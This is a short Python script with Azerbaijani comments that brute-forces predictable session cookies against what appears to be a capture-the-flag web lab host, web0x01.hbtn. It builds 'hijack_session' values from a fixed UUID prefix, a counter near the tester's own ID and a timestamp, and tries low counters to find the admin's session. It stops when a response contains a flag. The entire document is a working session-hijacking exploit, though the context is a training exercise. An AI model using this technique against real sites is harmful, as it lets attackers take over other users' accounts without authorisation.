import requests

target_url = "http://web0x01.hbtn/a1/hijack_session"

# Sənin şəkildəki sabit hissələr
base_uuid = "3f877254-08c4-4e14-8bc"
timestamp = "17686685352" 

# Axtarış aralığı: Sənin ID-n ətrafındakı rəqəmlər
# Həmçinin 0-dan başlayan kiçik rəqəmləri də yoxlaya bilərik
start_counter = 2093891 

print("Sessiya axtarışı (Content Length analizi)...")
print("-" * 50)
print(f"{'ID':<10} | {'Status':<10} | {'Uzunluq (Length)':<15} | {'Nəticə'}")
print("-" * 50)

# 1. STRATEGIYA: Sənin ətrafındakı ID-lər (±50)
for i in range(-50, 50):
    current_counter = start_counter + i
    cookie_value = f"{base_uuid}-{current_counter}-{timestamp}"
    cookies = {'hijack_session': cookie_value}
    
    try:
        response = requests.get(target_url, cookies=cookies)
        length = len(response.text)
        
        # Sadə nəticə göstəricisi
        print(f"{current_counter:<10} | {response.status_code:<10} | {length:<15} | ...")
        
        # Əgər "Flag" sözü varsa, dərhal dayansın
        if "Flag" in response.text or "flag" in response.text:
             print(f"\n[!!!] FLAG TAPILDI: ID {current_counter}")
             print(response.text)
             break

    except Exception as e:
        print(f"Xəta: {e}")

# 2. STRATEGIYA: Çox kiçik rəqəmlər (Admin adətən ilk istifadəçidir)
print("\nAdmin sessiyası (0-10) yoxlanılır...")
for i in range(10):
    cookie_value = f"{base_uuid}-{i}-{timestamp}"
    cookies = {'hijack_session': cookie_value}
    response = requests.get(target_url, cookies=cookies)
    length = len(response.text)
    print(f"{i:<10} | {response.status_code:<10} | {length:<15} | ...")
    
    if "Flag" in response.text or "flag" in response.text:
        print(f"\n[!!!] FLAG TAPILDI: ID {i}")
        print(response.text)
        break
